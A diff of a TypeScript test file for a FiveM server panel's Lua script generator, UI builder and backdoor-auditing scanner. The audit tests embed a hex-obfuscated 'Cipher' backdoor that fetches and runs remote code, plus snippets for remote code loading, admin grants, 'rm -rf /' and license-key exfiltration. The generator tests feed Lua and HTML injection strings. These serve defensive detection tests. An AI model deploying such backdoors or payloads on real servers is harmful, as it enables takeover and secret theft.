@@ -44,6 +44,10 @@ type Mods = {
   studio: typeof import("../src/lib/studio");
   shared: typeof import("../src/lib/studio-shared");
   zip: typeof import("../src/lib/zip");
+  blocks: typeof import("../src/lib/studio-blocks");
+  ui: typeof import("../src/lib/studio-ui");
+  auditRules: typeof import("../src/lib/audit-rules");
+  audit: typeof import("../src/lib/server-audit");
 };
 let m: Mods;
 let db: Mods["db"]["db"];
@@ -76,7 +80,11 @@ before(async () => {
     live: await import("../src/lib/security-live"),
     studio: await import("../src/lib/studio"),
     shared: await import("../src/lib/studio-shared"),
-    zip: await import("../src/lib/zip")
+    zip: await import("../src/lib/zip"),
+    blocks: await import("../src/lib/studio-blocks"),
+    ui: await import("../src/lib/studio-ui"),
+    auditRules: await import("../src/lib/audit-rules"),
+    audit: await import("../src/lib/server-audit")
   };
   db = m.db.db;
 });
@@ -466,7 +474,7 @@ test("database: batches are atomic, migrations are idempotent and safe to run co
   const before = (await client.execute("SELECT COUNT(*) AS n FROM schema_migrations")).rows[0].n;
   await Promise.all([runMigrations(client), runMigrations(client)]);
   assert.equal((await client.execute("SELECT COUNT(*) AS n FROM schema_migrations")).rows[0].n, before);
-  assert.equal(Number(before), 18);
+  assert.equal(Number(before), 19);
 });
 
 test("bot API: sync snapshot, member event, voice events, heartbeat, playtime, shutdown", async () => {
@@ -1310,4 +1318,311 @@ test("studio creations: versions, restore, unique resource, deploy queued for th
   assert.equal(await m.studio.deleteCreation(SV, actor, id), true);
   assert.equal(await m.studio.getCreation(SV, id), null);
   assert.equal((await db.get<{ n: number }>("SELECT COUNT(*) AS n FROM studio_versions WHERE creation_id = ?", [id]))!.n, 0);
+});
+
+/** A Blockly workspace with these top blocks. */
+const ws = (...blocks: unknown[]) => ({ blocks: { languageVersion: 0, blocks } });
+const chain = (...list: Record<string, unknown>[]): Record<string, unknown> | undefined =>
+  list.length ? { ...list[0], ...(list.length > 1 ? { next: { block: chain(...list.slice(1)) } } : {}) } : undefined;
+const balanced = (files: { path: string; content: string }[]) =>
+  files.filter((f) => f.path.endsWith(".lua")).every((f) => { const b = m.shared.luaBalance(f.content); return b.opens === b.ends; });
+
+test("studio blocks: events run on the right side, server actions reach the player, misplaced blocks warned", () => {
+  const starter = m.blocks.blocksFiles("Soin", "standalone", m.blocks.STARTER_BLOCKS);
+  assert.deepEqual(starter.files.map((f) => f.path), ["fxmanifest.lua", "client.lua", "server.lua"]);
+  assert.deepEqual(starter.warnings, []);
+  const server = starter.files[2].content;
+  assert.match(server, /RegisterCommand\("soin", function\(src, args\)/);
+  assert.match(server, /TriggerClientEvent\(EVENT, src, "heal"\)/);
+  assert.match(server, /TriggerClientEvent\(EVENT, src, "notify", "Tu es soigné !"\)/);
+  assert.match(starter.files[1].content, /function A\.heal\(\)[\s\S]*RegisterNetEvent\(EVENT/);
+  assert.ok(balanced(starter.files));
+  assert.equal(m.shared.checkFiles(starter.files).filter((c) => c.level === "error").length, 0);
+
+  // Key + zone on the client; money and admin check misplaced there; an orphan block.
+  const text = (t: string) => ({ shadow: { type: "text", fields: { TEXT: t } } });
+  const client = m.blocks.blocksFiles("Test", "esx", ws(
+    { type: "fvx_on_key", fields: { KEY: "F6" }, inputs: { DO: { block: chain({ type: "fvx_repair" }, { type: "fvx_money", fields: { MODE: "ADD", ACCOUNT: "cash" } }) } } },
+    { type: "fvx_on_zone", fields: { X: 1, Y: 2, Z: 3, R: 4, PRESS: true, MARKER: false }, inputs: { DO: { block: { type: "controls_if", inputs: { IF0: { block: { type: "fvx_is_admin" } }, DO0: { block: { type: "fvx_notify", inputs: { TEXT: text("ok") } } } } } } } },
+    { type: "fvx_heal" }
+  ));
+  assert.deepEqual(client.files.map((f) => f.path), ["fxmanifest.lua", "client.lua"]);
+  const c = client.files[1].content;
+  assert.match(c, /RegisterKeyMapping\(KEY_1, .*"keyboard", "F6"\)/);
+  assert.match(c, /A\.repair\(\)/);
+  assert.match(c, /vector3\(1, 2, 3\), 4/);
+  assert.match(c, /if false then/);
+  assert.doesNotMatch(c, /RegisterNetEvent|money\(|DrawMarker/);
+  assert.equal(client.warnings.length, 3, client.warnings.join(" | "));
+  assert.ok(client.warnings.some((w) => /argent/.test(w)) && client.warnings.some((w) => /admin/.test(w)) && client.warnings.some((w) => /hors d'un événement/.test(w)));
+  assert.ok(balanced(client.files));
+
+  // Money: framework helper and dependency; standalone refuses; admin command restricted.
+  const money = (fw: "esx" | "qbcore" | "standalone") => m.blocks.blocksFiles("Paie", fw, ws({
+    type: "fvx_on_command", fields: { NAME: "/Paie", ADMIN: true },
+    inputs: { DO: { block: { type: "fvx_money", fields: { MODE: "REMOVE", ACCOUNT: "bank" }, inputs: { AMOUNT: { block: { type: "fvx_cmd_arg", fields: { N: 1 } } } } } } }
+  }));
+  const esx = money("esx");
+  assert.match(esx.files[0].content, /dependencies \{ 'es_extended' \}/);
+  assert.match(esx.files[1].content, /getSharedObject[\s\S]*RegisterCommand\("paie"[\s\S]*money\(src, -\(tonumber\(\(args\[1\] or ""\)\) or 0\), "bank"\)[\s\S]*end, true\)/);
+  assert.deepEqual(esx.files.map((f) => f.path), ["fxmanifest.lua", "server.lua"]);
+  assert.match(money("qbcore").files[1].content, /QBCore\.Functions\.GetPlayer\(src\)/);
+  assert.ok(money("standalone").warnings.some((w) => /framework/.test(w)));
+  assert.ok(balanced(esx.files));
+
+  // Field values never break out of the Lua: names are checked, texts escaped.
+  const bad = m.blocks.blocksFiles("X", "standalone", ws(
+    { type: "fvx_on_command", fields: { NAME: 'a") os.execute("rm' }, inputs: { DO: { block: { type: "fvx_heal" } } } },
+    { type: "fvx_on_start", inputs: { DO: { block: chain(
+      { type: "fvx_notify", inputs: { TEXT: text('"]] os.execute("x") --\n') } },
+      { type: "fvx_vehicle", fields: { MODEL: "adder'); os.exit(" } }
+    ) } } }
+  ));
+  const all = bad.files.map((f) => f.content).join("\n");
+  assert.doesNotMatch(all, /RegisterCommand\("a/);
+  assert.match(all, /A\.notify\("\\"\]\] os\.execute\(\\"x\\"\) --\\n"\)/);
+  assert.doesNotMatch(all, /A\.vehicle/);
+  assert.ok(bad.warnings.some((w) => /commande invalide/.test(w)) && bad.warnings.some((w) => /véhicule invalide/.test(w)));
+
+  // A crafted, very deep workspace does not overflow; an oversized one is refused.
+  let deep: Record<string, unknown> = { type: "math_number", fields: { NUM: 1 } };
+  for (let i = 0; i < 5000; i++) deep = { type: "logic_negate", inputs: { BOOL: { block: deep } } };
+  const deepWs = ws({ type: "fvx_on_start", inputs: { DO: { block: { type: "controls_if", inputs: { IF0: { block: deep } } } } } });
+  assert.doesNotThrow(() => m.blocks.blocksFiles("D", "standalone", deepWs));
+  assert.throws(() => m.blocks.cleanBlocks({ blocks: { blocks: [{ type: "x".repeat(400_000) }] } }), /blocks_too_large/);
+
+  // Every block of the toolbox is understood by the generator.
+  for (const def of m.blocks.BLOCK_DEFS) {
+    const type = String(def.type);
+    const res = m.blocks.blocksFiles("T", "esx", ws({ type: "fvx_on_command", fields: { NAME: "t" }, inputs: { DO: { block: def.output !== undefined ? { type: "fvx_print", inputs: { TEXT: { block: { type } } } } : { type } } } }));
+    assert.ok(!res.warnings.some((w) => /inconnu/.test(w)), `${type}: ${res.warnings.join()}`);
+  }
+});
+
+test("studio simple UI: escaped page, opening by command or key, HUD without focus, invalid values dropped", () => {
+  const design = m.ui.cleanUIDesign({
+    open: "key", command: "/Mon Menu!", key: "F7", position: "tr", width: 5000, accent: "red", theme: "glass",
+    elements: [
+      { type: "title", text: "<script>alert(1)</script>" },
+      { type: "button", text: "Don", action: "command", command: "don;quit" },
+      { type: "image", url: "javascript:alert(1)" },
+      { type: "gauge", label: "Vie", stat: "nope", color: "#123456" },
+      { type: "evil" }
+    ]
+  });
+  assert.equal(design.command, "monmenu");
+  assert.equal(design.width, 900);
+  assert.equal(design.accent, "#8b5cf6");
+  assert.deepEqual(design.elements.map((e) => e.type), ["title", "button", "image", "gauge"]);
+  assert.equal((design.elements[1] as { command: string }).command, "donquit");
+  assert.equal((design.elements[2] as { url: string }).url, "");
+  assert.equal((design.elements[3] as { stat: string }).stat, "health");
+
+  const files = m.ui.uiFiles("Mon menu", design);
+  assert.deepEqual(files.map((f) => f.path), ["fxmanifest.lua", "client.lua", "html/index.html"]);
+  const html = files[2].content;
+  assert.match(html, /&lt;script&gt;alert\(1\)&lt;\/script&gt;/);
+  assert.match(html, /top: 4vh; right: 3vw;/);
+  assert.match(html, /id="app" class="hidden"/);
+  assert.match(files[1].content, /RegisterCommand\("monmenu"[\s\S]*RegisterKeyMapping\("monmenu", .*"F7"\)[\s\S]*RegisterNUICallback\("command"[\s\S]*GetPedArmour/);
+  assert.ok(balanced(files));
+  assert.equal(m.shared.checkFiles(files).filter((c) => c.level === "error").length, 0);
+  assert.deepEqual(m.ui.uiTests(design).map((t) => t.label), ["Ouvrir", "Fermer", "Stats pleines", "Stats basses"]);
+
+  const hud = m.ui.UI_TEMPLATES.find((t) => t.key === "hud")!.make();
+  const hudFiles = m.ui.uiFiles("HUD", hud);
+  assert.doesNotMatch(hudFiles[1].content, /SetNuiFocus|RegisterCommand/);
+  assert.doesNotMatch(hudFiles[2].content, /class="hidden"/);
+  for (const t of m.ui.UI_TEMPLATES) assert.ok(balanced(m.ui.uiFiles(t.label, t.make())), t.key);
+});
+
+test("studio visual creations: files generated from blocks / builder on every save, code mode keeps the code", async () => {
+  const SV = "studio-visual";
+  const actor = { discordId: A, username: "a" };
+  const sid = await m.studio.createCreation(SV, actor, { kind: "script", name: "Blocs", framework: "standalone", visual: true });
+  let script = (await m.studio.getCreation(SV, sid))!;
+  assert.equal(script.data.mode, "visual");
+  assert.match(script.files.find((f) => f.path === "server.lua")!.content, /RegisterCommand\("soin"/);
+
+  // Files sent with a visual save are ignored: they come from the blocks.
+  const pay = ws({ type: "fvx_on_command", fields: { NAME: "paie" }, inputs: { DO: { block: { type: "fvx_money", fields: { MODE: "ADD", ACCOUNT: "cash" }, inputs: { AMOUNT: { shadow: { type: "math_number", fields: { NUM: 100 } } } } } } } });
+  script = await m.studio.saveCreation(SV, actor, sid, { files: [{ path: "server.lua", content: "os.execute('x')" }], data: { mode: "visual", blocks: pay } }, { source: "manual" });
+  assert.doesNotMatch(script.files.map((f) => f.content).join(), /os\.execute|money\(src/);
+  script = await m.studio.saveCreation(SV, actor, sid, { framework: "qbcore" }, { source: "manual" });
+  assert.match(script.files.find((f) => f.path === "server.lua")!.content, /money\(src, \(tonumber\(100\) or 0\), "cash"\)/);
+
+  // Code mode: the files are what is written.
+  const code = [{ path: "fxmanifest.lua", content: "fx_version 'cerulean'\ngame 'gta5'\nserver_script 'server.lua'" }, { path: "server.lua", content: "print('main')" }];
+  script = await m.studio.saveCreation(SV, actor, sid, { files: code, data: { mode: "code" } }, { source: "manual" });
+  assert.equal(script.data.mode, undefined);
+  assert.equal(script.files[1].content, "print('main')");
+  await assert.rejects(m.studio.saveCreation(SV, actor, sid, { data: { mode: "visual", blocks: { blocks: { blocks: [{ type: "x".repeat(400_000) }] } } } }, { source: "manual" }), /blocks_too_large/);
+
+  const uid = await m.studio.createCreation(SV, actor, { kind: "ui", name: "Mon HUD", framework: "standalone", visual: true, template: "hud" });
+  const ui = (await m.studio.getCreation(SV, uid))!;
+  assert.equal(ui.data.ui?.open, "always");
+  assert.deepEqual(ui.files.map((f) => f.path), ["fxmanifest.lua", "client.lua", "html/index.html"]);
+  assert.deepEqual(ui.data.tests?.map((t) => t.label), ["Stats pleines", "Stats basses"]);
+});
+
+// ---- Server audit ----
+
+/** Real-world shape of the "Cipher" backdoor: function names hidden as \x escapes, looked up in _G, payload loaded. */
+const CIPHER = String.raw`local _ = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74", "\x61\x73\x73\x65\x72\x74", "\x6c\x6f\x61\x64", _G, "", nil} _[4][_[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30", function (e, d) local s = _[4][_[2]](_[4][_[3]](d)) if (d == nil) then return end s() end)`;
+const rulesOf = (path: string, code: string, role: "client" | "server" | "shared" | "ui" | "other") =>
+  m.auditRules.analyzeFile(path, code, role).findings.map((f) => `${f.severity}:${f.rule}`);
+
+test("audit rules: known backdoors are critical (hidden escapes, remote code, admin grant, system commands, secret theft)", () => {
+  const cipher = rulesOf("server.lua", CIPHER, "server");
+  assert.ok(cipher.includes("critical:hidden_code") && cipher.includes("critical:known_backdoor"), cipher.join());
+  assert.deepEqual(rulesOf("s.lua", "PerformHttpRequest('https://x.example/p', function(c, body)\n  load(body)()\nend)", "server"), ["critical:remote_code"]);
+  assert.deepEqual(rulesOf("s.lua", "RegisterCommand('x', function(src)\n  ExecuteCommand('add_principal identifier.' .. id .. ' group.admin')\nend)", "server"), ["critical:grant_admin"]);
+  assert.deepEqual(rulesOf("s.lua", "local f = io.popen('whoami')", "server"), ["critical:system_command"]);
+  assert.ok(rulesOf("s.lua", "local k = GetConvar('sv_licenseKey', '')\nPerformHttpRequest('https://x.example', function() end, 'POST', k)", "server").includes("critical:secret_exfiltration"));
+  assert.ok(rulesOf("s.lua", "local _G = _G\n_G['Perform' .. 'HttpRequest']('https://x', function() end)", "server").includes("critical:hidden_code"));
+  assert.deepEqual(rulesOf("s.js", "const https = require('https');\nhttps.get(u, r => { let d = ''; r.on('end', () => eval(d)) })", "server"), ["critical:remote_code"]);
+  assert.deepEqual(rulesOf("s.js", "require('child_process').exec('rm -rf /')", "server"), ["critical:system_command"]);
+  // Not backdoors: loading a file of the resource, the same words in comments and strings, eval in a NUI page.
+  assert.deepEqual(rulesOf("s.lua", "-- PerformHttpRequest then load(body)\nlocal msg = 'os.execute is bad'\nlocal cfg = load(LoadResourceFile(GetCurrentResourceName(), 'config.lua'))()", "server"), []);
+  assert.deepEqual(rulesOf("html/app.js", "fetch('https://cdn.example/x').then(() => eval('1+1'))", "ui"), []);
+});
+
+test("audit rules: exploitable events, SQL injections, secrets, client-side trust, performance, old libraries", () => {
+  const events = m.auditRules.analyzeFile("server.lua", [
+    "RegisterNetEvent('shop:buy', function(item, amount)",
+    "  local xPlayer = ESX.GetPlayerFromId(source)",
+    "  xPlayer.addInventoryItem(item, amount)",
+    "end)",
+    "RegisterNetEvent('job:pay', function()",
+    "  ESX.GetPlayerFromId(source).addMoney(500)",
+    "end)",
+    "RegisterNetEvent('job:safe', function()",
+    "  if #(GetEntityCoords(GetPlayerPed(source)) - Config.Point) > 5.0 then return end",
+    "  ESX.GetPlayerFromId(source).addMoney(Config.Pay)",
+    "end)"
+  ].join("\n"), "server");
+  assert.deepEqual(events.findings.map((f) => [f.rule, f.line]), [["trusted_event", 3], ["unchecked_reward", 5]]);
+  assert.deepEqual(events.events, ["shop:buy", "job:pay", "job:safe"]);
+  assert.match(events.findings[0].snippet!, /addInventoryItem\(item, amount\)/);
+
+  assert.ok(rulesOf("s.lua", `MySQL.Async.fetchAll("SELECT * FROM users WHERE identifier = '" .. id .. "'", {})`, "server").includes("high:sql_injection"));
+  assert.ok(!rulesOf("s.lua", "MySQL.query('SELECT * FROM users WHERE identifier = ?', { id })", "server").includes("high:sql_injection"));
+  assert.ok(rulesOf("s.js", "exports.oxmysql.query(`SELECT * FROM users WHERE id = ${id}`)", "server").includes("high:sql_injection"));
+  assert.ok(rulesOf("s.lua", "for _, p in ipairs(players) do\n  MySQL.update('UPDATE users SET x = 1 WHERE id = ?', { p })\nend", "server").includes("medium:sql_in_loop"));
+
+  const hook = 'local URL = "https://discord.com/api/webhooks/123456789/abc-DEF_ghi"';
+  assert.deepEqual(rulesOf("client.lua", hook, "client"), ["high:exposed_webhook"]);
+  assert.deepEqual(rulesOf("server.lua", hook, "server"), ["info:server_webhook"]);
+  assert.deepEqual(rulesOf("html/app.js", "const key = 'gsk_" + "a".repeat(48) + "'", "ui"), ["high:exposed_secret"]);
+
+  assert.ok(rulesOf("c.lua", "TriggerServerEvent('shop:buyItem', 'bread', 50)", "client").includes("medium:client_trust"));
+  const loop = (body: string) => `CreateThread(function()\n  while true do\n    Wait(0)\n    ${body}\n  end\nend)`;
+  assert.deepEqual(rulesOf("c.lua", loop("local ped = PlayerPedId()"), "client"), ["medium:busy_loop"]);
+  assert.deepEqual(rulesOf("c.lua", loop("DrawMarker(1, 0, 0, 0)"), "client"), []);
+  assert.deepEqual(rulesOf("c.lua", "local ped = GetPlayerPed(-1)", "client"), ["info:deprecated_native"]);
+  assert.ok(rulesOf("s.lua", "MySQL.Async.execute('UPDATE x SET y = 1', {})", "server").includes("medium:old_mysql"));
+});
+
+test("audit report: manifests, dependencies, assets, server.cfg, artifacts and a score capped by critical problems", () => {
+  const file = (p: string, role: "client" | "server" | "shared" | "ui" | "other", hash: string, kind: "code" | "stream" = "code", size = 100) => ({ p, size, hash: kind === "code" ? hash : undefined, role, kind });
+  const h = (c: string) => c.repeat(64);
+  const inv = {
+    convars: { sv_scriptHookAllowed: "1", version: "FXServer-master SERVER v1.0.0.7290 win32" },
+    rcon: true,
+    cfg: [{ path: "server.cfg", content: "ensure shop\nensure es_extended\nadd_ace builtin.everyone command allow\nadd_ace resource.shop command allow\nadd_ace resource.fiverax_agent command allow" }],
+    resources: [
+      { name: "es_extended", state: "started", meta: { fx_version: "cerulean", lua54: "yes" }, files: [file("server.lua", "server", h("a"))] },
+      { name: "shop", state: "started", meta: { fx_version: "adamant", dependencies: ["es_extended", "ox_lib", "/onesync"] }, files: [file("server.lua", "server", h("b")), file("stream/car.ytd", "other", "", "stream", 20 * 1048576)] },
+      { name: "cars", state: "started", meta: { fx_version: "cerulean", lua54: "yes" }, files: [file("stream/car.ytd", "other", "", "stream")] },
+      { name: "old", state: "stopped", meta: { legacy: true }, files: [] },
+      { name: "paid", state: "started", meta: { fx_version: "cerulean" }, protected: true, files: [{ ...file("client.lua", "client", h("c")), enc: true }] }
+    ]
+  };
+  const results = new Map([[`${h("b")}:server:.lua`, m.auditRules.analyzeFile("server.lua", CIPHER, "server")]]);
+  const report = m.auditRules.buildReport(inv, results, { build: 7290, recommended: 12000, critical: 5000 });
+  const rules = report.findings.map((f) => `${f.rule}:${f.resource ?? ""}`);
+  for (const expected of [
+    "hidden_code:shop", "known_backdoor:shop", "missing_dependency:shop", "old_fx_version:shop", "no_lua54:shop", "oversized_asset:shop",
+    "duplicate_asset:shop", "legacy_manifest:old", "protected:paid", "scripthook:", "open_ace:", "wide_ace:", "rcon:", "old_artifacts:", "ensure_order:shop", "not_analyzed:"
+  ]) assert.ok(rules.includes(expected), `${expected} missing in ${rules.join(", ")}`);
+  assert.equal(report.findings.filter((f) => f.rule === "wide_ace").length, 1, "the agent's own ace is expected");
+  assert.ok(!rules.includes("missing_dependency:shop") || !report.findings.some((f) => f.rule === "missing_dependency" && /onesync/.test(f.detail)));
+  assert.deepEqual(report.findings.slice(0, 3).map((f) => f.severity), ["critical", "critical", "critical"]);
+  assert.ok(report.score <= 35, `score ${report.score}`);
+  assert.ok(report.categories.security.score <= 40);
+  assert.equal(report.stats.protected, 1);
+  assert.equal(report.stats.skipped, 1); // es_extended/server.lua: no result
+
+  const clean = m.auditRules.score([]);
+  assert.equal(clean.score, 100);
+  // A rule repeated many times weighs less than as many different problems.
+  const many = Array.from({ length: 20 }, () => ({ ...report.findings.find((f) => f.rule === "no_lua54")!, severity: "medium" as const }));
+  assert.ok(m.auditRules.score(many).categories.maintenance.score > 100 - 20 * 4);
+});
+
+test("audit flow: inventory without code, only unknown files sent, hashes checked, shared reputation, report and history", async () => {
+  const crypto = await import("node:crypto");
+  const sha = (s: string) => crypto.createHash("sha256").update(s, "utf8").digest("hex");
+  const SA = "audit-a";
+  const SB = "audit-b";
+  const backdoor = CIPHER;
+  const config = "Config = {}\nConfig.Price = 10";
+  const inventory = (scanId: number | null) => ({
+    scanId,
+    convars: {},
+    cfg: [],
+    resources: [{
+      name: "shop", state: "started", meta: { fx_version: "cerulean", lua54: "yes" },
+      files: [
+        { p: "server.lua", size: backdoor.length, hash: sha(backdoor), role: "server" as const, kind: "code" as const },
+        { p: "config.lua", size: config.length, hash: sha(config), role: "shared" as const, kind: "code" as const }
+      ]
+    }]
+  });
+
+  const scanId = await m.audit.createScan(SA, A, "manual");
+  assert.ok(await m.audit.runningScan(SA));
+  const first = await m.audit.receiveInventory(SA, m.audit.inventorySchema.parse(inventory(scanId)));
+  assert.equal(first.scanId, scanId);
+  assert.equal(first.need.length, 2);
+  const key = (role: string, hash: string) => `${hash}:${role}:.lua`;
+  // Content that does not match its hash is ignored (nobody can whitelist a backdoor by sending other code).
+  assert.equal(await m.audit.receiveFiles(SA, { scanId, files: [{ key: key("server", sha(backdoor)), path: "server.lua", content: "print('clean')" }] }), 0);
+  assert.equal(await m.audit.receiveFiles(SA, { scanId, files: [
+    { key: key("server", sha(backdoor)), path: "server.lua", content: backdoor },
+    { key: key("shared", sha(config)), path: "config.lua", content: config }
+  ] }), 2);
+  const report = await m.audit.finishScan(SA, scanId, { artifacts: null });
+  assert.ok(report.findings.some((f) => f.rule === "known_backdoor" && f.resource === "shop" && f.file === "server.lua"));
+  assert.equal(report.stats.analyzed, 2);
+  const stored = await db.get<{ inventory_json: string | null; report_json: string }>("SELECT inventory_json, report_json FROM audit_scans WHERE id = ?", [scanId]);
+  assert.equal(stored!.inventory_json, null);
+  assert.ok(!stored!.report_json.includes("Config.Price"), "code that is not a problem is never kept");
+
+  // Another server with the same files: nothing to send, same result (reputation by hash).
+  const auto = await m.audit.receiveInventory(SB, m.audit.inventorySchema.parse({ ...inventory(null), auto: true }));
+  assert.deepEqual(auto.need, []);
+  const reportB = await m.audit.finishScan(SB, auto.scanId, { artifacts: null });
+  assert.equal(reportB.score, report.score);
+  assert.equal((await m.audit.listScans(SB))[0].trigger, "auto");
+
+  // Confidential mode: no file is asked for.
+  const conf = await m.audit.receiveInventory(SB, m.audit.inventorySchema.parse({ ...inventory(null), confidential: true, resources: [{ ...inventory(null).resources[0], files: [{ p: "new.lua", size: 3, hash: sha("x=1"), role: "server", kind: "code" }] }] }));
+  assert.deepEqual(conf.need, []);
+  await m.audit.failScan(SB, conf.scanId, "test");
+  assert.equal((await m.audit.listScans(SB))[0].status, "failed");
+
+  assert.equal(await m.audit.shouldAutoScan(SA), false); // continuous audit off
+  await m.audit.saveAuditSettings(SA, { discordId: A }, { continuous: true, alert: true });
+  assert.equal(await m.audit.shouldAutoScan(SA), false); // a scan just ran
+  assert.equal(await m.audit.shouldAutoScan(SA, new Date(Date.now() + 30 * 60_000)), true);
+
+  delete process.env.AI_API_KEY;
+  await assert.rejects(m.audit.explainFinding(SA, scanId, 0), /ai_not_configured/);
+  assert.deepEqual(m.audit.parseExplanation('```json\n{"verdict":"false_positive","explanation":"Sûr.","fix":null}\n```'), { verdict: "false_positive", explanation: "Sûr.", fix: null });
+  assert.equal(m.audit.parseExplanation('{"verdict":"maybe","explanation":"x"}'), null);
+
+  assert.equal((await m.audit.latestReport(SA))!.id, scanId);
+  await assert.rejects(m.audit.receiveFiles(SA, { scanId, files: [] }), /unknown_scan/); // finished scans accept nothing
+  assert.equal(m.agent.COMMANDS.audit.permission, "security_config");
 });
